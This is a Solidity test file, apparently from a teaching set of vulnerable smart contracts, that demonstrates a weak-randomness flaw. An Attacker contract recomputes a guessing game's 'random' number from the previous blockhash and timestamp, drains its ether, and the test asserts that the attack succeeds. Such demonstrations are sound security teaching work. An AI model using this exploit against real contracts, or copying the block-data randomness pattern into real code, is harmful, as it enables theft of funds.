// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/console.sol";
import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";
import "../../bad_randomness_example/game.sol";

contract GuessTheRandomNumberTest is BaseTest {
    GuessTheRandomNumber game;

    function setUp() public override {
        game = new GuessTheRandomNumber{value: 1 ether}();
    }

    function testAttack() public payable {
        // deploy attacker contract
        Attacker attacker = new Attacker{value: 1 ether}(game);
        attacker.attack();
        // check if attack success
        uint balanceAfter = address(attacker).balance;
        assertGt(balanceAfter, 1 ether, "Attack should succeed and balance should increase");
    }
}

contract Attacker {
    GuessTheRandomNumber guessTheRandomNumber;

    receive() external payable {}

    constructor(GuessTheRandomNumber _guessTheRandomNumber) payable {
        guessTheRandomNumber = _guessTheRandomNumber;
    }

    function attack() public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );
        guessTheRandomNumber.guess(answer);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}